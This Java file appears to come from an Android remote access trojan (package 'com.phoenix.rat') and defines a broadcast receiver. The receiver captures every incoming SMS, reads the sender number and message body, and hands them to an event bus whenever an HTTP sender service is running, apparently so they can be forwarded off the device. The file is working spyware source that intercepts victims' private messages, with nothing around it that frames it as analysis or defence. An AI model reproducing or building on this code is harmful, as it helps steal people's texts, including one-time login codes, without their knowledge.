package com.phoenix.rat.broadcasts;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

import com.mjhp.eventbus.MBus;
import com.phoenix.rat.enums.ServiceState;
import com.phoenix.rat.services.HttpSenderService;

public class SmsReceiver extends BroadcastReceiver {
    final SmsManager sms = SmsManager.getDefault();
    public SmsReceiver() {
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        final Bundle bundle = intent.getExtras();

        try {

            if (bundle != null) {

                final Object[] pdusObj = (Object[]) bundle.get("pdus");
                String phone = "", msg = "";
                for (int i = 0; i < pdusObj.length; i++) {

                    SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                    String phoneNumber = currentMessage.getDisplayOriginatingAddress();

                    String message = currentMessage.getDisplayMessageBody();

                    phone = phoneNumber;
                    msg += message;
                }

                if (HttpSenderService.STATE == ServiceState.RUNNING){
                    MBus.subscribe(new com.phoenix.rat.events.SmsMessage(phone, msg));
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
